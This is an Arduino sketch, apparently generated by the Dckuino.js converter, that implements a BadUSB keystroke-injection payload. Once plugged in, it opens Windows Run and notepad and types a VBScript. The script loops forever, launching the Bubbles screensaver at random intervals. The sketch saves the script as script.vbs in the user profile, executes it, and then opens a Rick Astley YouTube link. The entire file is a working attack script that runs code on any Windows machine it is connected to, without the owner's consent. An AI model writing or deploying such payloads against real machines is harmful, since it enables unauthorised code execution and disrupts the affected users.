/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}


/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("notepad.exe");
  typeKey(KEY_RETURN);

  delay(100);
Keyboard.print("max=10000");
  delay(50);
typeKey(KEY_RETURN);
  delay(50);
Keyboard.print("min=1000");
  delay(50);
typeKey(KEY_RETURN);
  delay(50);
Keyboard.print("Randomize");
  delay(50);
typeKey(KEY_RETURN);
  delay(50);
Keyboard.print("do");
  delay(50);
typeKey(KEY_RETURN);
  delay(50);
Keyboard.print("CreateObject(");
  delay(10);
Keyboard.write(34);
  delay(10);
Keyboard.print("WScript.Shell");
  delay(10);
  Keyboard.write(34);
  delay(10);
  Keyboard.print(").Run(");
  delay(10);
Keyboard.write(34);
  delay(10);
Keyboard.write(34);
  delay(10);
Keyboard.write(34);
  delay(10);

/*C:\Windows\System32\Bubbles.scr*/

Keyboard.print("C:");
  delay(10);
Keyboard.write(92);
  delay(10);
Keyboard.print("Windows");
  delay(10);
Keyboard.write(92);
  delay(10);
Keyboard.print("System32");
delay(10);
Keyboard.write(92);
  delay(10);
Keyboard.print("Bubbles.scr");
  delay(10);
Keyboard.write(34);
  delay(10);
Keyboard.write(34);
  delay(10);
Keyboard.write(34);
  delay(10);
Keyboard.print(")");

  delay(100);
typeKey(KEY_RETURN); 
  delay(100);
Keyboard.print("WScript.Sleep(Int((max-min+1)*Rnd+min))");
  delay(100);
typeKey(KEY_RETURN); 
  delay(100);
Keyboard.print("loop");
  delay(100);

Keyboard.press(KEY_RIGHT_CTRL);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(50);
Keyboard.print("%userprofile%");
  delay(10);
Keyboard.write(92);
  delay(10);
Keyboard.print("script.vbs");
  delay(10);
  typeKey(KEY_RETURN); 
  delay(50);

Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

Keyboard.print("%userprofile%");
  delay(10);
Keyboard.write(92);
  delay(10);
Keyboard.print("script.vbs");
  delay(10);
  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO");

  typeKey(KEY_RETURN);
  

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
